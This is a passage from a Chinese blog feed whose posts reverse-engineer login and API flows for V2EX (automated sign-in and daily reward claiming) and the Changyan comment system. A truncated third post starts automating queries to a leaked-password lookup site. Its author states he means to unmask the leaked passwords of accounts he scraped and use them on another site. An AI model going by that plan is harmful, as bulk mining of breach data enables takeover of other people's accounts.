width=&quot;120&quot; align=&quot;right&quot;&gt;用户名&lt;/td&gt;</span><br><span class="line">                &lt;td width=&quot;auto&quot; align=&quot;left&quot;&gt;&lt;input type=&quot;text&quot; class=&quot;sl&quot; name=&quot;804c76d3f1472cdd8721d16f21de446186f2bae893748542ffda39963ff293f4&quot; value=&quot;111111111111111&quot; autofocus=&quot;autofocus&quot; autocorrect=&quot;off&quot; spellcheck=&quot;false&quot; autocapitalize=&quot;off&quot; placeholder=&quot;用户名或电子邮箱地址&quot; /&gt;&lt;/td&gt;</span><br><span class="line">            &lt;/tr&gt;</span><br><span class="line">            &lt;tr&gt;</span><br><span class="line">                &lt;td width=&quot;120&quot; align=&quot;right&quot;&gt;密码&lt;/td&gt;</span><br><span class="line">                &lt;td width=&quot;auto&quot; align=&quot;left&quot;&gt;&lt;input type=&quot;password&quot; class=&quot;sl&quot; name=&quot;359a3968b3b6f37b05fceed766bd8995090a4fd5cdc74ba0a8cd17b44d2bc86e&quot; value=&quot;&quot; autocorrect=&quot;off&quot; spellcheck=&quot;false&quot; autocapitalize=&quot;off&quot; /&gt;&lt;/td&gt;</span><br><span class="line">            &lt;/tr&gt;</span><br><span class="line">            &lt;tr&gt;</span><br><span class="line">                &lt;td width=&quot;120&quot; align=&quot;right&quot;&gt;&lt;/td&gt;</span><br><span class="line">                &lt;td width=&quot;auto&quot; align=&quot;left&quot;&gt;&lt;input type=&quot;hidden&quot; value=&quot;79599&quot; name=&quot;once&quot; /&gt;&lt;input type=&quot;submit&quot; class=&quot;super normal button&quot; value=&quot;登录&quot; /&gt;&lt;/td&gt;</span><br><span class="line">            &lt;/tr&gt;</span><br><span class="line">            &lt;tr&gt;</span><br><span class="line">                &lt;td width=&quot;120&quot; align=&quot;right&quot;&gt;&lt;/td&gt;</span><br><span class="line">                &lt;td width=&quot;auto&quot; align=&quot;left&quot;&gt;&lt;a href=&quot;/forgot&quot;&gt;我忘记密码了&lt;/a&gt;&lt;/td&gt;</span><br><span class="line">            &lt;/tr&gt;</span><br><span class="line">        &lt;/table&gt;</span><br><span class="line">        &lt;input type=&quot;hidden&quot; value=&quot;/&quot; name=&quot;next&quot; /&gt;</span><br><span class="line">        &lt;/form&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">&lt;/div&gt;</span><br></pre></td></tr></table></figure>
<p>名字对应字段是<code>&lt;input type=&quot;text&quot; class=&quot;sl&quot; name=&quot;804c76d3f1472cdd8721d16f21de446186f2bae893748542ffda39963ff293f4&quot;</code>，</p>
<p>密码对应字段是<code>&lt;input type=&quot;password&quot; class=&quot;sl&quot; name=&quot;359a3968b3b6f37b05fceed766bd8995090a4fd5cdc74ba0a8cd17b44d2bc86e&quot;</code>，</p>
<p>可以通过正则获取到字段名。</p>
<p>名字正则：<code>r&#39;&lt;input type=&quot;text&quot; class=&quot;sl&quot; name=&quot;([\d\w]*?)&quot;&#39;</code></p>
<p>密码正则：<code>r&#39;&lt;input type=&quot;password&quot; class=&quot;sl&quot; name=&quot;([\d\w]*?)&quot;&#39;</code></p>
<p>也看到了其他两个数据字段，<code>&lt;input type=&quot;hidden&quot; value=&quot;79599&quot; name=&quot;once&quot; /&gt;</code> 和 <code>&lt;input type=&quot;hidden&quot; value=&quot;/&quot; name=&quot;next&quot; /&gt;</code>。</p>
<p><code>once</code>对应的值每次都不一样，<code>next</code>的值应该是固定的<code>/</code>，但是为了保险，都通过正则来获取</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">r&apos;&lt;input type=&quot;hidden&quot; value=&quot;([\d\w]+?)&quot; name=&quot;once&quot; /&gt;&apos;</span><br><span class="line">r&apos;&lt;input type=&quot;hidden&quot; value=&quot;(.+?)&quot; name=&quot;next&quot; /&gt;&apos;</span><br></pre></td></tr></table></figure>
<p>好了，到此登录请求需要的东西都分析完了，然后就是模拟接口发送请求了。</p>
<p>忘了还有一点，返回状态的判断。</p>
<p>前面看到登录错误的有提示信息，为了更人性化，把这个信息拿到吧。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">//登录错误</span><br><span class="line">&lt;div class=&quot;box&quot;&gt;</span><br><span class="line">    &lt;div class=&quot;header&quot;&gt;&lt;a href=&quot;/&quot;&gt;V2EX&lt;/a&gt; &lt;span class=&quot;chevron&quot;&gt;&amp;nbsp;›&amp;nbsp;&lt;/span&gt; 登录 &amp;nbsp;&lt;li class=&quot;fa fa-lock&quot;&gt;&lt;/li&gt;&lt;/div&gt;</span><br><span class="line">    &lt;div class=&quot;problem&quot;&gt;请解决以下问题然后再提交：&lt;ul&gt;&lt;li&gt;用户名和密码无法匹配&lt;/li&gt;&lt;/ul&gt;&lt;/div&gt;</span><br></pre></td></tr></table></figure>
<p>获取错误信息正则是这样：<code>r&#39;&lt;div class=&quot;problem&quot;&gt;.+?&lt;ul&gt;&lt;li&gt;(.*?)&lt;/li&gt;&lt;/ul&gt;&lt;/div&gt;&#39;</code></p>
<p>登录成功判断待会儿再分析。</p>
<p>通过py发送模拟登陆请求，代码如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">payload = &#123;</span><br><span class="line">                self.form_name:name,</span><br><span class="line">                self.form_pass:pwd,</span><br><span class="line">                &apos;once&apos;: self.form_once,</span><br><span class="line">                &apos;next&apos;: self.form_next</span><br><span class="line">                &#125;</span><br><span class="line">r = self.s.post(url, data=payload, headers=headers)</span><br></pre></td></tr></table></figure>
<p>保存了返回数据一看，没成功啊，还是未登录的首页。</p>
<p>重新再浏览器登录一下，仔细分析了一下。</p>
<p>发送了登录请求之后，登录成功之后，页面自动跳转到<code>https://www.v2ex.com</code>，有登录信息了。</p>
<p>猜测对请求的头部数据做了某些校验。</p>
<p>看看请求的头部数据，如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Host: www.v2ex.com</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:54.0) ...</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 167</span><br><span class="line">Referer: https://www.v2ex.com/signin</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br></pre></td></tr></table></figure>
<p>一般来说可能会对host，referer等字段检查，加入尝试一下。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">headers = &#123;</span><br><span class="line">    #&apos;Host&apos;: &apos;www.v2ex.com&apos;,</span><br><span class="line">    #&apos;origin&apos;:&apos;https://www.v2ex.com&apos;,</span><br><span class="line">    &apos;referer&apos;:&apos;https://www.v2ex.com/signin&apos;,                </span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>成功登录，屏蔽其中一些字段，发现只需要加入referer即可登录。</p>
<p>获取登录成功状态，可以看到登录成功后，会有用户账户信息，如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=&quot;/member/anhkgg&quot; class=&quot;top&quot;&gt;anhkgg&lt;/a&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;</span><br><span class="line">&lt;a href=&quot;https://workspace.v2ex.com/&quot; target=&quot;_blank&quot; class=&quot;top&quot;&gt;工作空间&lt;/a&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;</span><br><span class="line">&lt;a href=&quot;/notes&quot; class=&quot;top&quot;&gt;记事本&lt;/a&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;a href=&quot;/t&quot; class=&quot;top&quot;&gt;时间轴&lt;/a&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;a href=&quot;/settings&quot; class=&quot;top&quot;&gt;设置&lt;/a&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;</span><br><span class="line">&lt;a href=&quot;#;&quot; onclick=&quot;if (confirm(&apos;确定要从 V2EX 登出？&apos;)) &#123; location.href= &apos;/signout?once=54090&apos;; &#125;&quot; class=&quot;top&quot;&gt;登出&lt;/a&gt;&lt;/td&gt;</span><br></pre></td></tr></table></figure>
<p>那么只需要搜索是否存在<code>&lt;a href=&quot;/member/anhkgg&quot;</code>即可。正则表达式是：<code>r&#39;&lt;a href=&quot;/member/.+?&quot;&gt;&#39;</code>。找到该内容表示登录成功。</p>
<h1 id="退出"><a href="#退出" class="headerlink" title="退出"></a>退出</h1><p>登录成功了，顺便看一下退出的接口。抓包看一下，发现访问了如下链接：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.v2ex.com/signout?once=71351</span><br></pre></td></tr></table></figure>
<p>又见到once字段，值又是每次不同的。那么也只有动态获取一下了。在前面登录成功的信息中其实可以看到有退出接口的内容。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">onclick=&quot;if (confirm(&apos;确定要从 V2EX 登出？&apos;)) &#123; location.href= &apos;/signout?once=54090&apos;; &#125;&quot; class=&quot;top&quot;&gt;登出&lt;/a&gt;&lt;/td&gt;</span><br></pre></td></tr></table></figure>
<p>通过正则获取一下once：<code>r&quot;location.href= &#39;/signout\?once=([\d\w]+?)&#39;&quot;</code>，然后模拟退出。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">url = &apos;https://www.v2ex.com/signout&apos;</span><br><span class="line">payload = &#123; &apos;once&apos;: self.signout_once&#125;</span><br><span class="line">self.s.get(url, params=payload)</span><br></pre></td></tr></table></figure>
<h1 id="新评论"><a href="#新评论" class="headerlink" title="新评论"></a>新评论</h1><p>接着就看看我需要的功能了。</p>
<p>首先是获取最新评论条数。找到对应html的内容，如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;/a&gt;&lt;/div&gt;&lt;a href=&quot;/notifications&quot; class=&quot;fade&quot;&gt;0 条未读提醒&lt;/a&gt;&lt;/div&gt;</span><br></pre></td></tr></table></figure>
<p>非常简单，关键字notifications，正则一搜即可拿到。</p>
<p><code>r&#39;&lt;a href=&quot;/notifications&quot;.*?&gt;(\d+)(.*?)&lt;/a&gt;&#39;</code></p>
<p>不在细说。</p>
<p>为了能主动提醒我是否有最新消息，登录成功后，没10分钟刷新一下<code>https://www.v2ex.com</code>，再获取评论条数即可。</p>
<p>有新评论就通知我。</p>
<h1 id="领取每日奖励"><a href="#领取每日奖励" class="headerlink" title="领取每日奖励"></a>领取每日奖励</h1><p>嗯，钱的事还是挺重要的。</p>
<p>首页右侧，每天会出现领取今日奖励的按钮，什么时候出现不知道（过了凌晨12点？），点击后跳转到领取页面，再点击领取按钮就拿到钱了！</p>
<p>第一步，拿到领取页面的链接。看下面，是固定的，终于省了一点点事。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;div class=&quot;box&quot;&gt;&lt;div class=&quot;inner&quot;&gt;&lt;li class=&quot;fa fa-gift&quot; style=&quot;color: #f90;&quot;&gt;&lt;/li&gt; &amp;nbsp;&lt;a href=&quot;/mission/daily&quot;&gt;领取今日的登录奖励&lt;/a&gt;&lt;/div&gt;&lt;/div&gt;</span><br></pre></td></tr></table></figure>
<p>通过下面的代码跳到领取页面。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">url = &apos;https://www.v2ex.com/mission/daily&apos;</span><br><span class="line">r= self.s.get(url)</span><br></pre></td></tr></table></figure>
<p>然后看看领取按钮对应的链接，又见once！so，链接不是固定的了。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;div class=&quot;cell&quot;&gt;</span><br><span class="line">        &lt;h1&gt;每日登录奖励 20170818&lt;/h1&gt;</span><br><span class="line">        &lt;input type=&quot;button&quot; class=&quot;super normal button&quot; value=&quot;领取 X 铜币&quot; onclick=&quot;location.href = &apos;/mission/daily/redeem?once=48881&apos;;&quot; /&gt;</span><br><span class="line">    &lt;/div&gt;</span><br></pre></td></tr></table></figure>
<p>动态获取once对应的值，正则跟退出接口很像：<code>r&quot;&#39;/mission/daily/redeem\?once=([\d\w]+?)&#39;&quot;</code></p>
<p>然后模拟请求领取奖励。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">url = &apos;https://www.v2ex.com/mission/daily/redeem&apos;</span><br><span class="line">payload = &#123; &apos;once&apos;: once&#125;</span><br><span class="line">r = self.s.get(url, params=payload)</span><br></pre></td></tr></table></figure>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>好了，到这里分析就完成了。分析内容非常详细，然后也贴了些关键代码，所以完整代码就暂时不提供了！</p>
<p>v2ex登录通过变化的名字和密码字段，以及once的值，增加了一定的分析成本，但是总的来说，还是没什么难度！挡不了多少人！</p>
<p>其他自动回复啊，最新主题啊…等等，各位看官自行脑洞了！</p>
<p>pylogin系列还将继续，尽请关注！</p>
<p>安利一下公众号：汉客儿</p>
<p><img src="/img/wechat_public.png" alt="img"></p>
<p>转载请注明出处，博客原文：<a href="https://anhkgg.github.io/pylogin-v2ex-login-analyze/">https://anhkgg.github.io/pylogin-v2ex-login-analyze/</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;概述&quot;&gt;&lt;a href=&quot;#概述&quot; class=&quot;headerlink&quot; title=&quot;概述&quot;&gt;&lt;/a&gt;概述&lt;/h1&gt;&lt;p&gt;最近开始混v2ex，v2ex发主题、回复都要收钱，发帖收钱还跟字数相关，之前不知道这些，发个帖子内容太多，kao，没钱了！&lt;/p&gt;
&lt;p&gt;虽然主题有人回复会收到钱，但是也没人回复啊，也不知道v2ex大佬们喜欢什么内容！&lt;/p&gt;
&lt;p&gt;幸好v2ex有个登录领币任务，每天还可以攒点钱，但是有些时候会忘啊，怎么办？…&lt;/p&gt;
&lt;p&gt;嗯，程序员嘛，偷懒的办法多…这就开始分析接口，自动领币！&lt;/p&gt;
    
    </summary>
    
      <category term="crawler" scheme="https://anhkgg.github.io/categories/crawler/"/>
    
    
      <category term="crawler" scheme="https://anhkgg.github.io/tags/crawler/"/>
    
      <category term="python" scheme="https://anhkgg.github.io/tags/python/"/>
    
      <category term="js" scheme="https://anhkgg.github.io/tags/js/"/>
    
      <category term="javascript" scheme="https://anhkgg.github.io/tags/javascript/"/>
    
      <category term="v2ex" scheme="https://anhkgg.github.io/tags/v2ex/"/>
    
      <category term="自动领币" scheme="https://anhkgg.github.io/tags/%E8%87%AA%E5%8A%A8%E9%A2%86%E5%B8%81/"/>
    
  </entry>
  
  <entry>
    <title>pylogin系列之畅言登录评论接口分析</title>
    <link href="https://anhkgg.github.io/pylogin-changyan-login-analyze/"/>
    <id>https://anhkgg.github.io/pylogin-changyan-login-analyze/</id>
    <published>2017-08-16T16:47:29.000Z</published>
    <updated>2017-08-16T17:05:02.929Z</updated>
    
    <content type="html"><![CDATA[<h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p>博客使用了畅言做评论系统（多说、网易云跟帖tmd相继挂了…）。<br>畅言后台可以看出功能非常强大，居然还有广告业务…<br>but，畅言登录之后，即使你选择了记住登录，也会在每次关闭浏览器后需要重新登录，很累好伐！</p>
<p>折腾了我几天之后，决定还是决定分析一下登录协议，以及简单后台操作接口，然后写个脚本跑着吧，有新评论就给我”叮”一下，就不用我常常登录去翻了！</p>
<a id="more"></a>
<h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><p>开始分析，工具：</p>
<ol>
<li>chrome/firefox</li>
<li>f12，network</li>
<li>python</li>
</ol>
<h2 id="登录"><a href="#登录" class="headerlink" title="登录"></a>登录</h2><p>chrome打开主页<a href="http://changyan.kuaizhan.com。" target="_blank" rel="noopener">http://changyan.kuaizhan.com。</a></p>
<p>F12，调到network的tab页，然后输入登录，找到登录的包。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">Request URL:http://changyan.kuaizhan.com/loginAjax?callback=jQuery17107352265034825938_1502508074058&amp;name=xxx&amp;rememberMe=true&amp;password=1111111&amp;vcode=4795&amp;vipIsvId=0&amp;_=1502508184633</span><br><span class="line">Request Method:GET</span><br><span class="line">Status Code:200 OK</span><br><span class="line"></span><br><span class="line">Host:changyan.kuaizhan.com</span><br><span class="line">Referer:http://changyan.kuaizhan.com/</span><br><span class="line">User-Agent:Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.109 Safari/537.36</span><br><span class="line">X-Requested-With:XMLHttpRequest</span><br><span class="line"></span><br><span class="line">callback:jQuery17107352265034825938_1502508074059 //可以没有</span><br><span class="line">name:xxx</span><br><span class="line">rememberMe:true</span><br><span class="line">password:1111111</span><br><span class="line">vcode:1882</span><br><span class="line">vipIsvId:0</span><br><span class="line">_:1502508368658</span><br><span class="line"></span><br><span class="line">//响应</span><br><span class="line">jQuery17101803876020131434_1502867163749(&#123;&quot;data&quot;:&#123;&#125;,&quot;code&quot;:0,&quot;msg&quot;:&quot;success&quot;&#125;); //发送了callback</span><br><span class="line">&#123;&quot;data&quot;:&#123;&#125;,&quot;code&quot;:0,&quot;msg&quot;:&quot;success&quot;&#125;; //没有发送callback</span><br><span class="line"></span><br><span class="line">//其他状态</span><br><span class="line">&#123;&quot;code&quot;:2,&quot;msg&quot;:&quot;验证码错误&quot;&#125;; </span><br><span class="line">&#123;&quot;code&quot;:2,&quot;msg&quot;:&quot;用户名或密码错误!&quot;&#125;</span><br></pre></td></tr></table></figure>
<p>很清晰，使用GET，ajax发送数据，主要发送name, password, vcode等数据，经验证callback是可以不需要的，如果发送callback，返回数据会包一层 <code>jQuery17101803876020131434_1502867163749(data)</code>, 如果没有callback，直接返回data。</p>
<p>很幸运的是，password没有做任何处理（貌似未强制https，那密码不是明文了…差评！）。没做处理，我倒简单了，不用做多余分析了，登录接口基本就这样。</p>
<p>然后是返回数据，是json数据，成功code是0，错误code是2，然后是具体错误msg。不细说。</p>
<h2 id="验证码"><a href="#验证码" class="headerlink" title="验证码"></a>验证码</h2><p>每次登录都需要验证码，挺烦的。为了自动登录，还得拿到验证码。</p>
<p>获取验证码接口如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Request URL:http://changyan.kuaizhan.com/verifyCode?_1502508320545</span><br><span class="line">Request Method:GET</span><br><span class="line"></span><br><span class="line">Content-Type:image/jpeg; charset=UTF-8</span><br></pre></td></tr></table></figure>
<p>返回一张jpg图片，验证码处理比较简单，应该可以用tesseract-ocr识别，没有验证。</p>
<p><img src="/img/changyan1.png" alt="img"></p>
<h2 id="评论"><a href="#评论" class="headerlink" title="评论"></a>评论</h2><p>登录成功后，进入后台。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Request URL:http://changyan.kuaizhan.com/overview</span><br><span class="line">Request Method:GET</span><br><span class="line">Status Code:200 OK</span><br></pre></td></tr></table></figure>
<p><img src="/img/changyan2.png" alt="img"></p>
<p>返回整个后台页面，通过页面元素找到评论位置，html代码如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;li class=&quot;right-sub-li &quot;&gt;&lt;a href=&quot;/audit/comments/TOAUDIT/1&quot; style=&quot;text-indent:25px;&quot;&gt;</span><br><span class="line">    &lt;span class=&quot;audit-number&quot;&gt;2&lt;/span&gt;</span><br><span class="line">    &lt;span style=&quot;text-indent:0px;&quot;&gt;本站评论审核&lt;/span&gt;&lt;/a&gt;&lt;/li&gt;</span><br></pre></td></tr></table></figure>
<p>通过<code>r&#39;&lt;span class=&quot;audit-number&quot;&gt;(\d+?)&lt;/span&gt;&#39;</code>正则可以获取到待审核评论数，也就是新增评论，要的就是这个。</p>
<h2 id="评论统计接口"><a href="#评论统计接口" class="headerlink" title="评论统计接口"></a>评论统计接口</h2><p>获取评论信息接口，使用的是ajax访问（我这用不上，顺便分析下）。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">Request URL:http://changyan.kuaizhan.com/stat-data/comment</span><br><span class="line">Request Method:POST</span><br><span class="line">Status Code:200 OK</span><br><span class="line"></span><br><span class="line">Host:changyan.kuaizhan.com</span><br><span class="line">Origin:http://changyan.kuaizhan.com</span><br><span class="line">Referer:http://changyan.kuaizhan.com/overview</span><br><span class="line">User-Agent:Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.109 Safari/537.36</span><br><span class="line">X-Requested-With:XMLHttpRequest</span><br><span class="line"></span><br><span class="line">start:20170805</span><br><span class="line">end:20170811</span><br><span class="line">categoryId:0</span><br><span class="line"></span><br><span class="line">//响应</span><br><span class="line">&#123;&quot;sdk_user_data&quot;:&#123;&#125;,&quot;user_data&quot;:&#123;&quot;20170810&quot;:1&#125;,&quot;sdk_cmt_data&quot;:&#123;&#125;,&quot;wap_cmt_data&quot;:&#123;&#125;,&quot;total_data&quot;:&#123;&quot;20170810&quot;:1,&quot;20170811&quot;:0&#125;,&quot;recommender_data&quot;:&#123;&#125;,&quot;wap_user_data&quot;:&#123;&#125;,&quot;cmt_data&quot;:&#123;&quot;20170810&quot;:1&#125;,&quot;wap_reply_data&quot;:&#123;&#125;,&quot;flood_data&quot;:&#123;&quot;20170810&quot;:0,&quot;20170811&quot;:0&#125;,&quot;sdk_reply_data&quot;:&#123;&#125;,&quot;success&quot;:true&#125;</span><br></pre></td></tr></table></figure>
<p>接口使用ajax POST，发送参数可以选择时间区间。</p>
<p>返回数据为json，具体意义如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">cmt_data : &#123;20170810: 1&#125; //评论数据1条</span><br><span class="line">flood_data : &#123;20170810: 0, 20170811: 0, 20170812: 0, 20170813: 0, 20170814: 0, 20170815: 0&#125; //每天flooddata多少条</span><br><span class="line">recommender_data : &#123;&#125;</span><br><span class="line">sdk_cmt_data : &#123;&#125;</span><br><span class="line">sdk_reply_data : &#123;&#125;</span><br><span class="line">sdk_user_data : &#123;&#125;</span><br><span class="line">success : true //获取评论信息成功</span><br><span class="line">total_data : &#123;20170810: 1, 20170811: 0, 20170812: 0, 20170813: 0, 20170814: 0, 20170815: 0&#125; // 所有评论数据</span><br><span class="line">user_data : &#123;20170810: 1&#125; //用户数据1条</span><br><span class="line">wap_cmt_data : &#123;&#125; //手机评论数据</span><br><span class="line">wap_reply_data : &#123;&#125;</span><br><span class="line">wap_user_data : &#123;&#125;</span><br></pre></td></tr></table></figure>
<p>对应页面如下：</p>
<p><img src="/img/changyan3.png" alt="img"></p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>畅言登录简单，密码未做处理，安全性有待提高。</p>
<p>接口不统一，评论数据需要正则匹配。</p>
<p>不过为了实现自己的小功能，还是挺简单的！</p>
<p>接口分析完，通过py实现以下接口。自动登录（不识别验证码，需要手动输入），然后每间隔30分钟访问一下后台页面，获取新的评论信息，如果有新的待评审数据，声音或弹窗提醒。</p>
<p>完毕！</p>
<p>转载请注明出处，博客原文：<a href="https://anhkgg.github.io/pylogin-changyan-login-analyze/">https://anhkgg.github.io/pylogin-changyan-login-analyze/</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;概述&quot;&gt;&lt;a href=&quot;#概述&quot; class=&quot;headerlink&quot; title=&quot;概述&quot;&gt;&lt;/a&gt;概述&lt;/h1&gt;&lt;p&gt;博客使用了畅言做评论系统（多说、网易云跟帖tmd相继挂了…）。&lt;br&gt;畅言后台可以看出功能非常强大，居然还有广告业务…&lt;br&gt;but，畅言登录之后，即使你选择了记住登录，也会在每次关闭浏览器后需要重新登录，很累好伐！&lt;/p&gt;
&lt;p&gt;折腾了我几天之后，决定还是决定分析一下登录协议，以及简单后台操作接口，然后写个脚本跑着吧，有新评论就给我”叮”一下，就不用我常常登录去翻了！&lt;/p&gt;
    
    </summary>
    
      <category term="crawler" scheme="https://anhkgg.github.io/categories/crawler/"/>
    
    
      <category term="crawler" scheme="https://anhkgg.github.io/tags/crawler/"/>
    
      <category term="python" scheme="https://anhkgg.github.io/tags/python/"/>
    
      <category term="js" scheme="https://anhkgg.github.io/tags/js/"/>
    
      <category term="javascript" scheme="https://anhkgg.github.io/tags/javascript/"/>
    
      <category term="畅言" scheme="https://anhkgg.github.io/tags/%E7%95%85%E8%A8%80/"/>
    
  </entry>
  
  <entry>
    <title>看我鼓捣华西安全网(cha.hxsec.com)密码泄露查询接口（有意思的js混淆）</title>
    <link href="https://anhkgg.github.io/hxsec-search-pwd-interface-analyze/"/>
    <id>https://anhkgg.github.io/hxsec-search-pwd-interface-analyze/</id>
    <published>2017-08-09T15:34:25.000Z</published>
    <updated>2017-08-09T22:30:22.763Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-开始"><a href="#0x00-开始" class="headerlink" title="0x00 开始"></a>0x00 开始</h1><p>最近爬个站的数据，然后想扫一下其他网站的同一个账号名能否找到泄露的密码，然后在这个站嘿嘿一下…</p>
<p>在 <a href="https://www.sec-wiki.com/topic/12" target="_blank" rel="noopener">sec-wiki</a> 找到了<a href="http://cha.hxsec.com/" target="_blank" rel="noopener">这个密码泄露查询网站</a>。</p>
<p>随便用了一下，发现网站虽然讲密码打码了，但是某些数据还是可以猜出来原始的内容，或者通过简单的计算拿到原始的内容。</p>
<p>but，我不能一个个输入然后看吧，数据虽然少，也有上千条啊，怎么说也是个python程序员，怎么也得鼓捣一下。</p>
<p>分析一下hxsec的查询接口，用python批量一下。</p>
<a id="more"></a>
<h1 id="0x01-分析接口"><a href="#0x01-分析接口" class="headerlink" title="0x01 分析接口"></a>0x01 分析接口</h1><p>hxsec查询界面如下：<br><img src="/img/hxsec1.png" alt="img"></p>
<p>其实接口很简单，f12，切换到network栏，然后随便输入什么，点击试试吧皆可以。</p>
<p>看到访问的网络接口如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Request URL:http://cha.hxsec.com/ajax.php?act=select</span><br><span class="line">Request Method:POST</span><br><span class="line">Status Code:200 OK</span><br><span class="line"></span><br><span class="line">select_act:3</span><br><span class="line">match_act:2</span><br><span class="line">key:ll111</span><br><span class="line">table:212300_cxhr_zhaopin_com</span><br></pre></td></tr></table></figure>
